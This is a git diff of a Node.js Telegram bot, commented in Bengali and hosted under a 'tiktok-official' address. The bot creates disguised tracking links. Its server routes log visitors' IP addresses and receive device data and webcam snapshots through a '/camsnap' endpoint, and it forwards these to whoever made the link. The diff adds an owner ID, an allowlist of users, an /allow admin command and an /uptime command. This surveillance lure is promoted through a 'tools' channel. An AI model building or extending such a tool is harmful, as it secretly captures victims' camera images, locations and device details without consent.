@@ -18,6 +18,16 @@ var hostURL="https://tiktok-official.onrender.com";
 // এই লাইনটি পরিবর্তন করা হয়েছে যেন লিঙ্ক শর্ট না হয়
 var usecodetabs=false;
 
+// আপনার Telegram User ID, যাকে Bot এর অ্যাডমিন বানানো হবে
+const ownerId = 6246410156;
+
+// অনুমোদিত ব্যবহারকারীদের তালিকা
+let allowedUsers = [6246410156];
+
+// Bot কখন চালু হয়েছে, তা ট্র্যাক করার জন্য
+const startTime = new Date();
+
+
 app.get("/w/:path/:uri",(req,res)=>{
 var ip;
 var d = new Date();
@@ -53,8 +63,14 @@ res.redirect("https://t.me/ehtool");
 bot.on('message', async (msg) => {
 const chatId = msg.chat.id;
 
+// শুধুমাত্র অনুমোদিত ব্যবহারকারীরাই বট ব্যবহার করতে পারবে
+if (!allowedUsers.includes(chatId) && chatId !== ownerId) {
+    bot.sendMessage(chatId, `দুঃখিত, আপনি এই বটটি ব্যবহার করার জন্য অনুমোদিত নন।`);
+    return;
+}
+
 if(msg?.reply_to_message?.text=="🌐 আপনার লিঙ্কটি দিন"){
- createLink(chatId,msg.text);
+ createLink(chatId,msg.text);
 }
 
 if(msg.text=="/start"){
@@ -76,12 +92,46 @@ bot.sendMessage(chatId,`এই বটের মাধ্যমে আপনি �
 \n\nঅবশ্যই আমাদের চ্যানেলে জয়েন হবেন আরোও টুলস পাওয়ার জন্য\n Telegram Channel : https://t.me/ehtool\nFacebook Page : https://www.facebook.com/profile.php?id=61580675061865
 `);
 }
-
-
+// নতুন কমান্ড: /allow <chat_id>
+else if (msg.text.startsWith('/allow')) {
+    if (chatId !== ownerId) {
+        bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
+        return;
+    }
+    const parts = msg.text.split(' ');
+    if (parts.length === 2) {
+        const userIdToAdd = parseInt(parts[1], 10);
+        if (!isNaN(userIdToAdd)) {
+            if (!allowedUsers.includes(userIdToAdd)) {
+                allowedUsers.push(userIdToAdd);
+                bot.sendMessage(chatId, `ইউজার আইডি ${userIdToAdd} সফলভাবে অনুমোদিত তালিকায় যুক্ত করা হয়েছে।`);
+            } else {
+                bot.sendMessage(chatId, `ইউজার আইডি ${userIdToAdd} ইতিমধ্যেই অনুমোদিত তালিকায় রয়েছে।`);
+            }
+        } else {
+            bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /allow <user_id>`);
+        }
+    } else {
+        bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /allow <user_id>`);
+    }
+}
+// নতুন কমান্ড: /uptime
+else if (msg.text === '/uptime') {
+    const uptimeInSeconds = Math.floor((new Date() - startTime) / 1000);
+    const hours = Math.floor(uptimeInSeconds / 3600);
+    const minutes = Math.floor((uptimeInSeconds % 3600) / 60);
+    const seconds = uptimeInSeconds % 60;
+    bot.sendMessage(chatId, `বটটি চালু আছে ${hours} ঘন্টা, ${minutes} মিনিট, এবং ${seconds} সেকেন্ড ধরে।`);
+}
 });
 
 bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
 bot.answerCallbackQuery(callbackQuery.id);
+// শুধুমাত্র অনুমোদিত ব্যবহারকারীরাই callback query ব্যবহার করতে পারবে
+if (!allowedUsers.includes(callbackQuery.from.id) && callbackQuery.from.id !== ownerId) {
+    bot.sendMessage(callbackQuery.from.id, `দুঃখিত, আপনি এই বটটি ব্যবহার করার জন্য অনুমোদিত নন।`);
+    return;
+}
 if(callbackQuery.data=="crenew"){
 createNew(callbackQuery.message.chat.id);
 }
@@ -99,9 +149,9 @@ if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https'
 
 var url=cid.toString(36)+'/'+btoa(msg);
 var m={
-  reply_markup:JSON.stringify({
-    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
-  } )
+  reply_markup:JSON.stringify({
+    "inline_keyboard":[[{text:"Create new Link",callback_data:"crenew"}]]
+  } )
 };
 
 var cUrl=`${hostURL}/c/${url}`;
@@ -175,7 +225,7 @@ res.send("Done");
 app.post("/",(req,res)=>{
 
 var uid=decodeURIComponent(req.body.uid) || null;
-var data=decodeURIComponent(req.body.data)  || null;
+var data=decodeURIComponent(req.body.data)  || null;
 if( uid != null && data != null){
 
 
@@ -190,7 +240,7 @@ res.send("Done");
 
 
 app.post("/camsnap",(req,res)=>{
-var uid=decodeURIComponent(req.body.uid)  || null;
+var uid=decodeURIComponent(req.body.uid)  || null;
 var img=decodeURIComponent(req.body.img) || null;
 
 if( uid != null && img != null){
